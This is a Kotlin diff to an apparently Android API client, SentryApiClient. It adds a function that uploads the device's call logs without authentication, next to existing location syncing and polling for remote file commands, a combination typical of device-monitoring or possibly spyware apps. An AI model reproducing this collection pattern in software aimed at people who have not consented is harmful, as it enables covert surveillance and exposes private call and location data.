@@ -114,6 +114,15 @@ class SentryApiClient(
         post("/location/sync", body, authenticated = false)
     }
 
+    suspend fun syncCallLogs(calls: org.json.JSONArray): Result<JSONObject> = withContext(Dispatchers.IO) {
+        val deviceId = CryptoManager.getOrCreateDeviceId(context)
+        val body = JSONObject().apply {
+            put("deviceId", deviceId)
+            put("calls", calls)
+        }
+        post("/calls/sync", body, authenticated = false)
+    }
+
     suspend fun pollFileCommands(): Result<JSONObject> = withContext(Dispatchers.IO) {
         val deviceId = CryptoManager.getOrCreateDeviceId(context)
         request("GET", "/files/command/$deviceId", null, authenticated = false)
